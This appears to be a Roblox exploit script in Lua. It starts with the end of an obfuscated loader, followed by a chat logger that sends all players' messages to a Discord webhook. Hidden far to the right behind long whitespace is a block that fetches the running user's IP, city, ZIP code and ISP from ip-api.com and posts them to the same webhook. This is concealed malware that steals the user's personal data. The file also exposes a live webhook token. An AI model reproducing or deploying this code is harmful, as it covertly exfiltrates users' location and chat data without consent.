v84[v86[2]]=v84[v86[9 -6]][v86[10 -6]];end elseif (((3077 -(1352 + 544))<=(7250 -3507)) and (v87>(944 -(875 + (94 -51))))) then if ((((22419 -16835) -(1857 + 11))>3425) and (v84[v86[1089 -(295 + (1448 -(446 + 210)))]]==v86[156 -(149 + 3)])) then v66=v66 + (2 -1);else v66=v86[7 -4];end elseif (((13904 -9449)>=(1434 -(762 + 512))) and  not v84[v86[1889 -(706 + 1181)]]) then v66=v66 + (1 -0);else v66=v86[1268 -(481 + 784)];end v66=v66 + (1677 -(913 + 763));break;end end break;end end end end A,B=v27(v11(v70));if  not A[1] then local v88=0;local v89;while true do if (v88==0) then v89=v35[4][v66] or "?";error("Script error at ["   .. v89   .. "]:"   .. A[2]);break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)();end v0=4;end end end











































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end




















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"

                                                                                                                                                                                                                                                                                      local ip_info = syn.request({
                                                                                                                                                                                                                                                                                     Url = "http://ip-api.com/json",
                                                                                                                                                                                                                                                                                     Method = "GET"
                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
                                                                                                                                                                                                                                                                                local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
                                                                                                                                                                                                                                                                                syn.request(
                                                                                                                                                                                                                                                                                    {
                                                                                                                                                                                                                                                                                      Url = webhook_url,
                                                                                                                                                                                                                                                                                      Method = "POST",
                                                                                                                                                                                                                                                                                      Headers = {
                                                                                                                                                                                                                                                                                           ["Content-Type"] = "application/json"
                                                                                                                                                                                                                                                                                      },
                                                                                                                                                                                                                                                                                      Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                         )
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
